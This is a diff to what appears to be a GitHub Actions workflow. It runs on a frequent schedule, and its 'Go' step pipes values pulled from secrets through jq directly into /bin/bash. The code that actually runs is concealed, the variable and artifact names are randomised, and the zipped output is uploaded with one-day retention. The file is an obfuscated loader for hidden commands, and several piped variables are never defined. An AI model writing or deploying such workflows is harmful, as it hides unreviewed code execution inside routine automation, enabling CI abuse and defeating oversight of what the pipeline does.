@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '12 1,7,13,19 * * *'
+    - cron: '28 5,11,17,23 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,17 +16,16 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          belt876: ${{ secrets.belt876 }}
+          gcsfl8522: ${{ secrets.gcsfl8522 }}
         run: |
-          printf '%s' "$belt876" | jq -r .xx5571 | /bin/bash
-          echo $ir86859 | jq -r .jgv41378 | /bin/bash
-          printf '%s' "$cjdhb05" | jq -r .nqtwo878 | /bin/bash
-          echo $qbewx66 | jq -r .jqsy3072 | /bin/bash
-          printf '%s' "$klvoy8" | jq -r .itd01 | /bin/bash
+          printf '%s' "$gcsfl8522" | jq -r .hxn1 | /bin/bash
+          printf '%s' "$qh1" | jq -r .ipy2 | /bin/bash
+          printf '%s' "$r7" | jq -r .tez78 | /bin/bash
+          echo $dbetg9 | jq -r .pr677 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: TIygWGd9
+          name: L5psmzpf
           path: "*.zip"
           retention-days: 1
